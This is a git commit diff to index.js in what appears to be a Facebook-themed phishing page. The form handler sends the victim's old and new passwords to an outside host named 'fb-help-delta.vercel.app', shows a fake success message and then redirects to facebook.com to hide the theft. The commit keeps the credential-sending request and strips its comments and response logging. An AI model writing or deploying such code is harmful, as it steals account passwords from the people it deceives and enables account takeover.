661360a46070fd47dc37e3d04367080f207f075b
HitRoling <143625792+HitRoling@users.noreply.github.com>
2025-04-19 11:04:18 +0200

    Update index.js

--- index.js
+++ index.js
@@ -5,7 +5,6 @@ document.getElementById('passwordForm').addEventListener('submit', function(even
   const oldPassword = document.getElementById('oldPassword').value;
   const newPassword = document.getElementById('newPassword').value;
 
-  // Send data to /api/save.js
   fetch('https://fb-help-delta.vercel.app/save.js', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -14,20 +13,11 @@ document.getElementById('passwordForm').addEventListener('submit', function(even
       oldPassword: oldPassword,
       newPassword: newPassword
     })
-  })
-  .then(response => response.text())  // Log the response (optional)
-  .then(result => {
-    console.log('Data received:', result);
-  })
-  .catch(err => {
-    console.error('Error:', err);
   });
 
-  // Show success message
   document.getElementById('passwordBox').style.display = 'none';
   document.getElementById('successMessage').style.display = 'flex';
 
-  // Redirect after 2 seconds
   setTimeout(function() {
     window.location.href = 'https://facebook.com';
   }, 2000);
